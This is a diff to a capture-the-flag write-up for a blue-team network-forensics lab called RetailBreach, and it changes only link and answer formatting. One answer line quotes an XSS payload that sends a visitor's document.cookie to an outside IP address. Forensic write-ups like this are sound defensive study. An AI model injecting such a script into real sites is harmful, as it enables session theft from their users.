@@ -6,7 +6,8 @@ tags: [cyber-defenders, network-forensics, writeup]
 ---
 
 **Category**: Network Forensics
-**Checkout the lab here**: https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach
+
+**Checkout the lab here**: <https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach>
 
 ![image.png](/assets/img/cyber-defenders/retail-breach/image.png)
 
@@ -54,7 +55,7 @@ To find the XSS payloads uploaded by the attacker, I going to filter the HTTP pa
 
 ![image.png](/assets/img/cyber-defenders/retail-breach/image%204.png)
 
-**Answer: <script>fetch('http://111.224.180.128/' + document.cookie);</script>**
+**Answer: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`**
 
 > **Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**
 > 
